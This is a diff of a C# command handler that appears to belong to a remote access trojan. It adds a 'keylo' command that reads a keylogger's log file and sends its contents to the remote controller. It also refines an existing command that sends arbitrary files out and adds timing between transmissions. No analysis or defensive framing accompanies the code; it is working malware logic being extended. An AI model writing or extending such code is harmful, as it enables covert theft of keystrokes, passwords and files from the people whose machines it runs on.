@@ -17,8 +17,13 @@
 
         private const int DIRECTORY_INTERVAL = 5;
         private const int TASKS_INTERVAL = 5;
+        private const int INTERVAL_SEND_FILE = 1000;
+
+        // In characteres
+        private const int MAX_BUFFER_CACHE_LENGTH = 500;
 
         private static string previousDirectory = string.Empty;
+        private string _fileBuffer = string.Empty;
 
         public Command(Connection connection)
         {
@@ -214,6 +219,9 @@
                         var buffer = file.ReadToEnd();
 
                         _connection?.SendData(information);
+
+                        Thread.Sleep(INTERVAL_SEND_FILE);
+
                         _connection?.SendData(buffer);
                     }
 
@@ -248,7 +256,8 @@
                     return;
                 }
 
-                if (commandReceived.Contains("fil"))
+                // TODO: Fix it
+                if (commandReceived.StartsWith("fil"))
                 {
                     var fileInfo = Regex.Split(commandReceived, "fil")[1];
                     var dataExtension = fileInfo.Contains("*")
@@ -260,7 +269,7 @@
                         return;
                     }
 
-                    var dataSplitted = dataExtension.Contains("+")
+                    var dataSplitted = dataExtension[1].Contains("+")
                         ? dataExtension[1].Split('+') : default(string[]);
 
                     // Error in command
@@ -292,6 +301,30 @@
 
                     return;
                 }
+
+                if (commandReceived.Contains("keylo"))
+                {
+                    // Getting the File Size for the keylogger
+                    var fileSize = new FileInfo(_connection.LoggerPath).Length;
+
+                    var information = string.Format("|archivo|{0}|{1}|", fileSize, _connection.LoggerPath.Contains("\\") ?
+                        _connection.LoggerPath.Split('\\').LastOrDefault() : _connection.LoggerPath);
+
+                    using (var file = new StreamReader(_connection.LoggerPath))
+                    {
+                        var buffer = file.ReadToEnd();
+
+                        _connection?.SendData(information);
+
+                        Thread.Sleep(INTERVAL_SEND_FILE);
+
+                        _connection?.SendData(buffer);
+                    }
+
+                    return;
+                }
+
+                _fileBuffer = _fileBuffer.Length < MAX_BUFFER_CACHE_LENGTH ? commandReceived : string.Empty;
             }
             catch (Exception ex)
             {
